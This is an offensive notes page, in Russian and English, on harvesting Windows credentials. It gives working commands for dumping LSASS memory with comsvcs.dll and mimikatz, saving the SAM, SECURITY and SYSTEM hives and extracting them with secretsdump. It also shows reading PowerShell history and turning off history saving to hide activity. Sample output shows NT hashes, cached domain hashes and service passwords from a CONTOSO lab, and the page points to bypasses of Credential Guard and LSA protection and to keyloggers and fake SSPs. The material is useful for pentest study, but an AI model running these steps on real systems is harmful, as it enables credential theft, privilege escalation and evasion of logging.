# Windows computers credentials

## LSASS credentials

### Info

LSASS – Local Security Authority Subsystem Service process (`lsass.exe`). Этот процесс отвечает за управление операциями, связанными с безопасностью,  включая аутентификацию пользователей.

В случае физического подключения к компьютеру или по RDP (**interactive logon**), кредсы пользователя сохраняются в LSASS для аутентификации на других компьютерах домена (**network logon**).

Замечание: если пользователь подключается по NTLM или Kerberos, кредсы не кэшируются (исключение: Kerberos delegation включен).

Кредсы кэшируются **SSP**s (Security Support Providers). Некоторые SSPs:

* [Kerberos SSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#kerberos-ssp) управляет аутентификацией Kerberos и сохраняет тикеты и Kerberos keys для авторизованных пользователей
* [NTLMSSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#ntlm-ssp) или MSV SSP управляют NTLM аутентификацией и сохраняют NTLM хеши для авторизованных пользователей
* [Digest SSP](https://zer1t0.gitlab.io/posts/attacking\_ad/#digest-ssp) — реализует Digest Access протокол, используемый HTTP-приложениями. Сохраняет пароли в открытом виде для вычисления хеш-сумм.

Even if the password caching is disabled by default since Windows 2008 R2, it is still possible to enable the password caching by setting the `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` registry entry to 1 or [patching the Digest SSP](https://blog.xpnsec.com/exploring-mimikatz-part-1/) directly in memory.

Следовательно, если мы можем получить доступ к памяти процесса LSASS (SeDebugPrivilege обязательна, обычно есть у администраторов), мы получим доступ к кэшированным кредсам.

### Dump

Обычно LSASS дампят с помощью mimikatz. Можем запустить mimikatz не машине или использовать [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/) или [werfault.exe](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/) для дампа процесса LSASS и после обработать этот дамп с помощью mimikatz или [pypikatz](https://github.com/skelsec/pypykatz). It is possible also to use [lsassy](https://github.com/Hackndo/lsassy) to read a dump remotely avoiding to have to download the entire memory dump, that can take several megabytes.

Пример с `comsvcs.dll`

```
> C:\windows\system32\rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $((Get-Process -name lsass).id) C:\$(hostname).dmp full
```

### Extract creds from dump

To extract credentials with mimikatz, there are a few commands you should know. They will retry different secrets from the logged users:

* `sekurlsa::logonpasswords`: Extracts the NT hashes and passwords.
* `sekurlsa::ekeys`: Gets the Kerberos keys.
* `sekurlsa::tickets`: Retrieves the Kerberos tickets stored in the machine (we can use the Rubeus dump command for that).

Specifically, in order to access to LSASS process memory, you need the [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113), that allows the user to debug processes of other users. Usually only the administrators have this privilege (but if another user gets this privilege she can become administrator).

Moreover, **SeDebugPrivilege must be enabled** in the process that tries to dump the LSASS memory. By default is enabled in Powershell and disabled in CMD (and therefore in their child processes). If you are launching mimikatz, you can enable it by using the `privilege::debug` command. In other case you can launch the process with Powershell using `powershell.exe <command>`, or using some tool like [sepriv](https://github.com/Zer1t0/sepriv) to enable it in CMD.

```
C:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 629376 (00000000:00099a80)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 03/05/2021 12:34:17
SID               : S-1-5-21-1372086773-2238746523-2939299801-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CONTOSO
         * NTLM     : b73fdfe10e87b4ca5c0d957f81de6863
         * SHA1     : 88cbc713492c32909ee5deddee08c7e31c70d716
         * DPAPI    : 0c1e1d360ebc8f790ff9577fcdb60d75
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CONTOSO
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CONTOSO.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Notwithstanding, you should be aware that LSASS can be protected against credential extraction.This could be achieved by [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works), that uses the hypervisor technology to store the credentials in a safer place outside of the operative system. However [Credential Guard can be bypassed](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/).

Additionally, `lsass.exe` can be configured to run as a PPL (Protected Process Light). Even if this makes more difficult the credentials extraction, it [can be disabled](https://www.redcursor.com.au/blog/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10).

## Registry credentials

### LSA secrets

LSA secrets — специальное хранилище  в реестре, которое содержит информацию, доступную только локальному пользователю SYSTEM. Физически хранится это в SECURITY hive-файле. Он зашифрован на BootKey/SysKey (хранится там же)

```
PS C:\> whoami
nt authority\system
PS C:\> reg query HKLM\SECURITY\Policy\Secrets

HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
    (Default)    REG_NONE

HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\$MACHINE.ACC
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DefaultPassword
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\NL$KM
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\_SC_mysql
```

Что может содержаться здесь:

* **Domain Computer Account**: пароль меняется каждые 30 дней автоматически. Этот аккаунт используется локальным аккаунтом SYSTEM для взаимодействия с DC. Этот аккаунт не имеет привилегий админа локально. Однако, его можно **использовать** для создания **Silver ticket** или проведения [**RBCD атак**](https://zer1t0.gitlab.io/posts/attacking\_ad/#s4u-attacks)**и** для получения доступа к хосту с правами администратора.
* **Service users passwords**: для запуска сервисов пользователя, система сохраняет пароли. Однако, сохраняется имя сервиса и пароль, а не пользователь и пароль. Имя пользователя надо будет узнать как-то еще.
* **Auto-logon password**: If windows [auto-logon is enabled](https://keithga.wordpress.com/2013/12/19/sysinternals-autologon-and-securely-encrypting-passwords/), the password can be stored in the LSA secrets. The other alternative is that it is saved in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry key under the key `DefaulUserName`. The domain and username are always stored in `DefaultDomainName` and `DefaultUserName`, respectively.
* **DPAPI master keys**: ключ для шифрования данных пользователя

В дополнение, в SECURITY hive файле сохраняются кредсы последнего доменного пользователя, авторизованного на хосте, известные как Domain cached credentials (DCC). Сохраняются для того, чтобы компьютер мог аутентифицировать пользователя, если  соединение с DC было потеряно. Хеши хранятся в формате MSCACHEV2/MSCASH и их нельзя использовать для Pass-The-Hash атаки, но можно [попробовать](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials) перебрать их. &#x20;

### SAM

SAM hive file содержит NT-хеши локальных пользователей

### Dumping registry credentials

Чтобы сдампить SECURITY и SAM, нам надо их считать из памяти с помощью mimikatz.

`token::elevate` для запроса сессии SYSTEM

`privilege::debug` если надо включить SeDebugPrivilege

* `lsadump::secrets`: Get the LSA secrets.
* `lsadump::cache`: Retrieve the cached domain logons.
* `lsadump::sam`: Fetch the local account credentials.

Другой способ: сдампить SECURITY, SAM и SYSTEM hive files:

```
C:\>reg save HKLM\SYSTEM system.bin
The operation completed successfully.

C:\>reg save HKLM\SECURITY security.bin
The operation completed successfully.

C:\>reg save HKLM\SAM sam.bin
The operation completed successfully.
```

Далее, забираем эти хранилища и на нашей тачке с помощью secretsdump.py смотрим, что внутри

```
$ secretsdump.py -system system.bin -security security.bin -sam sam.bin  LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
[*] Dumping cached domain logon information (domain/username:hash)
CONTOSO.LOCAL/anakin:$DCC2$10240#anakin#2933cad9235d2f502d7bedc2016e6553
CONTOSO.LOCAL/han:$DCC2$10240#han#4a52a6d0d7f3590c68124f4d5f7ef285
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:59aa6b91e74a0a6fc40efee9f2fb07936a9d69f46397dee82d3ec6ca4d0c01a0293d79e5c040bf564b7938d6c25597816921ec614ad25933af6a2482a8ace4d1dd54dd4bb465384b30046d85f65083e885455ec5f01dcae30df619e3f944eaa008a09e0f7432981f7cdb8dea34e432f00ed92e1ae3e48111326deb2d0f9a6e7d868e24c840b8814d338a4165f90381a4a6b824addb4f71c5908cac4423a4efbc5a4d846c09245930b526a6bec8c678ca838a005dcf5014f8b18426c3e0dbd3921f82c57e6ca025d0258d4536a9e0b68b90ff26c054c992c84d11e95f78c55ca411ee0e5b412cb4fc0f08c28ca2d79996
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b13dae64def5f205f382a0ab4174eb85
[*] DefaultPassword 
(Unknown User):user
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6880eb76862df7875705885938102c696717eb18
dpapi_userkey:0x828326418633117212de44bcda10806fc6765d4a
[*] NL$KM 
 0000   0B BC 2E DB A1 A7 E2 42  56 6D B8 4B 5A 37 79 A4   .......BVm.KZ7y.
 0010   53 51 75 6D 64 7F 9A BF  DC BF C2 83 F4 64 02 A6   SQumd........d..
 0020   5E E8 53 AB E5 4B 35 A4  5B 19 7E 97 E0 CA 32 6C   ^.S..K5.[.~...2l
 0030   77 68 E8 F1 C0 54 AD 7B  03 F7 BE 59 2E 59 C3 93   wh...T.{...Y.Y..
NL$KM:0bbc2edba1a7e242566db84b5a3779a45351756d647f9abfdcbfc283f46402a65ee853abe54b35a45b197e97e0ca326c7768e8f1c054ad7b03f7be592e59c393
[*] _SC_mysql 
(Unknown User):Solo1234!
[*] Cleaning up...
```

В секции Dumping cached domain logon information содержатся DCC. Чтобы побрутать их hashcat'ом, сохраняем их в виде `$DCC2$10240#username#hash`

Секция $MACHINE.ACC содержит Computer account password (в hex) и NT-hash

The section `DefaultPassword` contains the Auto-logon password. In order to get the domain and username, you need to check the `DefaultDomainName` and `DefaultUserName` entries of the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` registry key.

The `DPAPI_SYSTEM` section contains the master DPAPI keys of the system. These keys allow to [decrypt the user files](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords).

The `NK$LM` give us the [key used to encrypt the Domain Cached Credentials](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/dumping-lsa-secrets-on-nt5-x64/), but since secretsdump already decrypt them is only for informational purposes.

Finally, the entries with format `_SC_<service>` are the ones that indicates the password of users that are running services. In this case, the `mysql` service. We don't know the username of the service user, but we can check it in the computer.

```powershell
PS C:\> Get-WmiObject win32_service -Filter "name='mysql'" | select -ExpandProperty startname
CONTOSO\han
```

## Powershell history

Где хранится

```powershell
(Get-PSReadlineOption).HistorySavePath
```

Проверяем Powershell-историю для всех пользователей

```powershell
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Не сохранять свою историю:

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

## Other places

LaZagne project — ищет кредсы в браузере и еще где-то [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

Для сбора кредсов можно ставить [keyloggers](https://www.tarlogic.com/en/blog/how-to-create-keylogger-in-powershell/) или фейковый [SSP](https://adsecurity.org/?p=1760).
